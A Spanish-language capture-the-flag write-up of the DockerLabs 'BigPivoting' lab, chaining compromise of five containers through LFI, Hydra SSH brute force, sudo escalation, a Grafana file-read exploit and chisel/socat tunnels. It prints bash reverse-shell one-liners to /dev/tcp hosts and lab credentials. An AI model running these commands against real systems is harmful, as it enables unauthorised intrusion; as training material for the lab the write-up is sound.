---
title: BigPivoting - DockerLabs
published: true
categories: DockerLabs
---

| OS    | Dificultad | Creator           |
| ----- | ---------- | ----------------- |
| Linux | Difícil    | ElPinguinoDeMario |


Buenas a todos antes de empezar con la maquina os dejo un esquema que he ido haciendo durante la maquina para que sea un poco mas visual.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f6f5baea-e53a-4de2-969e-aca263b2b9a7)

También dejo el link para que lo podáis ver bien

https://excalidraw.com/#json=F0pKFrAZ31tFpyHGZfMBP,3DjBbERZnzq3ysvDuMk5vg

# Maquina 1

## Escaneo y Reconocimiento de puertos

Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap a la IP 10.10.10.2.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/74a81d15-5910-42b0-9cea-63279ac970e9)

`nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2`
- `-p-` - Búsqueda de puertos abiertos
- `--open` - Enumera los puertos abiertos
- `-sS` - Es un modo de escaneo rapido
- `-sC-` - Que use un conjunto de scripts de reconocimiento
- `-sV` - Que encuentre la version del servicio abirto
- `--min-rate=5000` - Hace que el reconocimiento aun vaya mas rapido mandando no menos de 5000 paquetes
- `-n` - No hace resolución DNS
- `-Pn` - No hace ping
- `-vvv` - Muestra en pantalla a medida que encuentra puertos (Verbose)

Vemos que esta abierto el puerto 22 `SSH` y el puerto 80 `HTTP`

## Enumeración Web
Si accedemos a la pagina web vemos lo siguiente

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/e4a95c92-76aa-4bb1-9cde-382bee92e6a7)

Es la página por defecto de Apache2.

Usamos `Gobuster` para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio.

`gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.20.10.5/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

Gobuster ha encontrado el directorio /shop, vamos a investigarlo.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/65467093-d944-4ac2-b69e-01e1f6f781cd)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/9bfcbca4-3625-41f7-bab5-08a3a7378bdd)

Nos encontramos esta pagina web, vemos que en la parte inferior hay un error, esto nos da una pista de que seguramente esta web sea vulnerable a un LFI vamos a probarlo.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/b9270a10-8c5b-4999-a043-cc5aa0f15637)

Efectivamente, y al listar el directorio /etc/passwd encontramos dos usuarios del sistema, con esta información ahora vamos hacer un ataque de fuerza bruta al puerto 22 *SSH*

## Ataque de fuerza bruta con Hydra

`hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2`
- `-l` - Para especificar el usuario
- `-P` - Para especificar que diccionario de fuerza bruta usaremos
- `ssh://10.10.10.2 - Especificamos que queremos atentar contra el protocolo SSH de la IP victima

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1d519000-2ff8-4bee-8be4-1c2088b1acd0)

Como vemos, existe el usuario `manchi` y la contraseña es `lovely`.

## Intrusión

Ahora accedemos vía SSH 

`ssh manchi@10.10.10.2`

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/47a96528-a8c1-4ec6-85c0-79f5a155e927)

Al no encontrar nada para poder escalar vamos a intentar hacer un ataque de fuerza bruta en local con un script que se puede descargar desde aquí 

```
https://github.com/Maalfer/Sudo_BruteForce
```

Al ejecutar el script que le hemos de pasar el usuario y el diccionario rockyou vemos que nos encuentra la contraseña

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/594e49b6-2a09-4078-bd5a-c65ecac56bc8)

Usuario *seller* con la contraseña *qwerty*

Vamos a escalar a este usuario.

## Escalada de privilegios

Ahora si hacemos un sudo -l vemos que podemos ejecutar el binario php como cualquier usuario, vamos a buscarlo en GTFObins

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/74c6c305-7884-46ce-806c-cd14a944dfeb)


Esta es la forma para poder escalar a root

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/29609b13-d1e1-4be0-ada6-a0eafedbfa45)

Lo que haremos sera lo siguiente:

```bash
sudo -u root /usr/bin/php -r "system('/bin/sh');"
```

Y nos convertiremos en root

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/07660f92-c1d3-490d-9e20-6996f4de7f53)

## Pivoting 1



Si hacemos un hostname -I vemos que hay otra interfaz de red la 20.20.20.2

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/dd387b38-3d03-4381-ada5-77d4682f0fec)

En este punto vamos a configurar el entorno de chisel para gestionar y reenviar los puertos de la 20.20.20.3 a nuestra maquina atacante.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/825fa826-2b95-456e-8393-72ad2e727dff)

Nos pasamos el chisel a la maquina 10.10.10.2.

Ahora desde la máquina atacante nos ponemos en escucha con chisel.

```bash
chisel server --reverse -p 1234
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f5068f1d-a073-4098-80f8-279bf537459c)

Y en la maquina victima con IP 10.10.10.2 configuramos el chisel para que podamos ver desde la maquina 10.10.10.1 la IP 20.20.20.2.

```
./chisel client 10.10.10.1:1234 R:socks
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/b75773e4-34cd-4ac2-b431-6bc929ed1fe1)

Perfecto ahora ya tenemos visibilidad de la maquina 20.20.20.2

# Maquina 2
## Escaneo y Reconocimiento de puertos

Vamos hacer un analisis de puertos, con nmap pero ahora siempre delante de cada instrucción hemos de poner el comando proxychains


```bash
proxychains nmap -sT -Pn -p- -sV --open -T5 -v -n 20.20.20.3 2>/dev/null
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/9f4595b3-1bb5-460e-bebc-f13fcae0417d)

Encontramos el puerto 21,22,80 y 3000

## Enumeración Web

Configuramos el proxy para poder visualizar lo que se aloja en el puerto 80 de la maquina 20.20.20.3

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/3f253a6b-fe97-4caf-93aa-96070d7bcbdd)

Y si accedemos al puerto 80 vemos que esta la Default Page de Apache2

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/82a12231-847e-4ee9-9e5e-e5380c6b431b)


Usamos `Gobuster` para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio.

`gobuster dir -u http://20.20.20.3/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php --proxy socks5://127.0.0.1:1080`
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.20.10.5/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

Nos encuentra el repositorio /maintence.html
![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1967761e-f69a-4cd7-ba37-6b06666e0839)
![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f65c48b5-52f9-43c8-9a62-ad783f434d81)

Nos encontramos esto pero no hay nada mas vamos a ver los otros puerto empezemos por el puerto 3000

## Puerto 3000


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a8fb2a29-8560-4723-83e9-a5559b985fe1)

En la parte inferior nos dice la versión de grafana

Si buscamos en searchsploit si hay algún exploit disponible nos pone que hay uno 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c68188b2-324e-44cd-b3d4-6d4104a02edd)

Con este script podemos ver archivos internos del servidor 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/6478b7db-bf7b-4713-9629-4bdd31835338)

Vamos a mirar la ruta que nos decia la pagina web a ver que hay

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/63b88535-f5ec-40ef-8fc3-07f13aca3b6f)

Tenemos una contraseña *t9sH76gpQ82UFeZ3GXZS*

## Puerto 21

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/22cfc878-75f4-4ede-adde-50ba5b942534)

Nos podemos conectar con el usuario anonymous vamos a ver si encontramos algo interesante

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c40e9566-cbbe-4b1a-9a91-e21b46b054ca)

Y nos encontramos con un archivo database.kdbx que es un archivo de keepass, lo descargamos

Vamos a intentar usar la contraseña para abrir el keepass

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/84267dee-f260-48c5-a82d-aa1314de0e23)

ES LA CONTRASEÑA!

Ahora vamos a intentar conectar con estas credenciales por ssh a ver si funcionan.

Usuario *freddy* contraseña *t9sH76gpQ82UFeZ3GXZS*

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/2bf86102-aa8f-4cf9-905e-fa2e6d9a7a26)

## Escalada de privilegios

Para escalar privilegio podemos hacer lo siguiente

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/76723142-a47b-41aa-8ba7-c26dafb38297)

Vemos que hay un script vamos a ver que hace

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a4036322-0995-417f-ba73-fe7246b31af0)

Vamos a ver si tenemos permisos para modificarlo

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/31904955-0497-43b1-88b9-52876381e62b)

Si que podemos vamos a escribir un codigo para que al ejecutarlo nos de una terminal como root.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/36b3186a-e263-4f29-82ca-dfe1d99635a1)

Vamos a ejecutarlo a ver si funciona

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/41811fcf-9941-4a6a-bffe-8945ba935422)

ya somos ROOT

## Pivoting 2

Si miramos cuantas interfaces de red tenemos vemos que hay 2 mas y tenemos el rango de ip's 30.30.30.2

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/d0ce0e71-1e56-4c5b-aa06-e0cf25f907a1)

Ahora desde la máquina 10.10.10.2 o 20.20.20.2 que es la misma nos compartimos el chisel a esta siguiente máquina mediante un servidor HTTP con python

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/cda37093-dd9a-4383-80bf-56f487b8447e)

Ahora desde la primera máquina la ip 10.10.10.2 o 20.20.20.2 vamos a necesitar socat para ir pasando la conexión de chisel

Entonces en nuestra maquina atacante nos descargamos el socat

```
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
```

Este lo compartimos con un servidor con pyhton a la maquina 10.10.10.2

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c690125d-ec17-495f-bd37-025e7418391c)


Y decimos que todo lo que nos llegue a la IP 10.10.10.0/24 que lo mande a la máquina atacante por el puerto 1234, que es donde tenemos chisel escuchando:

```
./socat tcp-l:1111,fork,reuseaddr tcp:10.10.10.1:1234
```

Ahora lo que tenemos que hacer es en compartir el chisel de la maquina 10.10.10.2 o 20.20.20.2 que es la misma a la maquina 20.20.20.3 o 30.30.30.2

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/cd7b1b46-e2dd-489c-8a17-029c47a2efba)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/5340c0e1-8c43-47d7-ae57-8a45680c3f92)

De esta forma lo que acabamos de hacer es decirle a chisel que todos los puertos sean redirigidos al puerto 8888 y que pase al socat de la maquina 10.10.10.2 o 20.20.20.2 que es la misma para que el socat lo redirigía al chisel que este termina en la maquina atacante

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/dec35aef-b100-4f38-9036-68a2c3fa34a1)

Ahora tenemos que editar el archivo proxychains.conf y vamos a editar el archivo de proxychains y descomentamos la línea donde dice scrict_chain:

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/12c88ea4-92eb-4085-91f5-7a761f9f0ea6)


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/6730d3c5-10a4-40a1-88e6-4d0fe063c318)


Configuramos en FoxyProxy el nuevo tunel 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1d1e69d3-a667-43b1-8e0b-379ad150e8de)

# Maquina 3

## Escaneo y Reconocimiento de puertos

Vamos hacer un analisis de puertos, con nmap pero ahora siempre delante de cada instrucción hemos de poner el comando proxychains


```bash
proxychains nmap -sT -Pn -p- -sV --open -T5 -v -n 30.30.30.3 2>/dev/null
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/b6287802-35fc-4902-80dc-b5b297408bbc)


Vemos que tenemos el puerto 80 y el puerto 22 abrietos entoces vamos a tirar de goubuster a ver que encuentra

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/80639867-424e-40d4-a04a-d3dcb544527a)

Y vemos que nos encuentra un /secret.php vamos a ver que es.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/04bb0cde-e60a-4e47-9d35-9515568fcb75)

Tenemos un posible usuario vamos hacer fuerza bruta al usuario por el protocolo ssh.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/44f6f587-9a2f-431d-9958-157cf5f3ae15)

Hacemos el comando *proxychains hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://30.30.30.3* y nos da la contraseña del usuario mario vamos a conectarnos a la maquina y busquemos la forma de escalar privilegios

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/4cf518d3-19a9-4463-be07-fda16b715276)

Listo ya somos ROOT vamos a ver las interfaces de red que hay

## Pivoting 3

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/57439c78-9f25-4f63-b671-747d888e0b7b)

Vemos la 40.40.40.2 vamos a pasarnos el socat a la maquina 20.20.20.3 y configuramos para que rediriga todo lo que le entre por el puerto 20.20.20.2:1111 asi tendremos acceso desde la primera maquina. De la siguiente forma

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c6c46894-f2c4-4de5-ba5b-9eb57dab9d82)

Ahora en la maquina 30.30.30.3 vamos a pasarnos el chisel para poder acceder a el desde la maquina atacante con el siguiente comando

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ae80acf4-2c03-420e-ae25-8986e0a7ce55)

Si lo hemos hecho bien en el chisel de nuestra maquina atacante aparecerá lo siguiente

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/7c338c21-2bad-42b6-9e7e-7ea8dab4bbdb)

Ahora vamos añadir el sock 9999 al archivo /etc/proxychains4.conf

## Maquina 4

Vemos que tenemos el puerto 80 abierto vamos a ver que hay en el.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/e943fd6a-6aa6-48f4-9818-d49ffa218f53)

Antes de hacer esto vamos a configurar el foxyproxy

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/9e831424-d06a-4ff2-8254-73ed0d168f94)

Vamos a ver que hay en el puerto 80

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f1fa551d-8850-493b-a6e0-a3adc737675b)

Vamos hacer fuzzing a ver si encontramos mas directorios

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/5850bd3c-5d9f-4267-ac44-8ae884dbc06e)

Encontramos el directorio uploads 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/8b950e5f-d84c-4f38-a618-55d883a3bfef)

Ahora vamos ha subir una web terminal 

## Pivoting 4

Ahora tenemos que preparar socat para que la reverse shell vaya desde esta IP 40.40.40.3 hasta nuestro Kali, por lo que enviaremos socat a la máquina anterior, desde la 10.10.10.0/24 a la 20.20.20.0/24 y desde la 30.30.30.0/24:

Lo hacemos de esta forma

En la primara maquina

```
socat tcp-l:4444,fork tcp:10.10.10.1:443
```

En la segunda
`
```
socat tcp-l:4444,fork tcp:20.20.20.2:4444
```

En la tercera

```
socat tcp-l:4444,fork tcp:30.30.30.2:4444
```

Nos ponemos en escucha por el puerto 443 con netcat

Y en la web terminal ponemos lo siguiente

```
bash -c "bash -i >& /dev/tcp/40.40.40.2/4444 0>&1"
```

Y nos va a dar la reverse shell

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0b363b3e-506a-4a38-8865-0120540c8f82)

Vamos a escalar privilegios

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/eb922e75-ed01-4192-861e-47cdfc893253)

Vemos que podemos usar el binario env como root vamos a escalar privilegios de esta forma


```bash
sudo -u root /usr/bin/env /bin/sh
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/22ab52ff-b8f4-41ee-905b-d06a8206cdee)


Ahora vamos a ver que interfaces tiene esta maquina

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0ec2289e-afcc-49f9-ab53-10b4a8928e19)

Vemos que tiene 2, ahora vamos a montar todos los túneles para poder acceder a la maquina en la red 50.50.50.2

En la primera maquina 

```
./socat tcp-l:3333,fork,reuseaddr tcp:10.10.10.1:1234
```

En la segunda maquina

```
./socat tcp-l:3333,fork,reuseaddr tcp:20.20.20.2:3333
```

En la tercera maquina

```
./socat tcp-l:3333,fork,reuseaddr tcp:30.30.30.2:3333
```

Y en la ultima maquina nos pasamos el chisel y hacemos lo siguiente

```
./chisel client 40.40.40.2:3333 R:5555:socks
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/76117dd1-c8d1-4a6c-8240-c71895311481)

Con esto lo que hacemos es que todo lo que pase por el puerto 3333 lo vaya pasando hasta la maquina atacante y creamos un nuevo socks que lo hemos de añadir al archivo /etc/proxychains4.conf.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a82e269f-c32e-469b-9b8c-5085db040f28)

# Maquina 5

Una vez hecho esto vamos hacer un escaneo de puerto de la maquina 50.50.50.3

Encontramos el puerto 80 vamos a ver que hay en la web pero antes vamos a configurar el foxyproxy

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/8e71277d-305e-4b03-b869-f70bc38de7ba)

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/12c31f30-d897-4df7-8207-7541d112899f)

Vemos esto en el interior de la web vamos hacer fuzzing con gobuster a ver si encontramos algo 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f6ce0164-a760-45a5-951a-e47fde14cda2)

Vemos un shell.php que no hay nada y un warning.html vamos acceder

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1299dc28-09ba-42c4-87a8-ab1250aaf482)

Entonces vamos a usar WFUZZ para ver cual es el parametro que falta ahi de la siguente forma

```bash
proxychains wfuzz -c --hh=53 --hc=404 -w usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-  
medium.txt -u "http://50.50.50.3/shell.php?FUZZ=id"
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/01148f8c-3eca-43cb-825b-f947cb249940)

Encontramos que el parametro es parameter vamos a ver si es correcto

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/79bc72dc-51fe-4c09-8bb3-fb378f12e33f)

Efectivamente es correcto ahora vamos a configurar para que nos mande una reverse shell pasando por todos los otros pc y que llegue a nuestro pc atacante.

## Ultima configuración

Realmente ya lo tenemos montado lo que nos falta es en la ultima maquina vulnerada la 40.40.40.3 vamos a pasarnos el socat y hacemos lo siguiente
```
./socat tcp-l:4444,fork tcp:40.40.40.2:4444
```

Ahora ya tenemos todo el tunel montado entonces vamos a enviar una reverse shell a nuestra maquina atacante

```
bash -c "bash -i >%26 /dev/tcp/40.40.40.2/4444 0>%261"
```

Y si esta todo bien deberiamos tener una reverse shell

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/c49d17d8-536e-4c78-a182-dcf65fdf34db)

Vemos que en la carpeta tmp hay un .secrects.txt y en su interior hay una contraseña vamos a probar a ver si es la contraseña de root

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0bdd55c1-1661-4f7b-a4dd-143d7229e42c)

Ya somos root ahora vamos a ver las interfaces de red

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ecbffc42-ec81-47dc-99ab-344f86d9c247)

Vemos que ya no hay mas entonces hasta aquí este wirteup sinceramente como diría el meme... *estoy cansado jefe...*

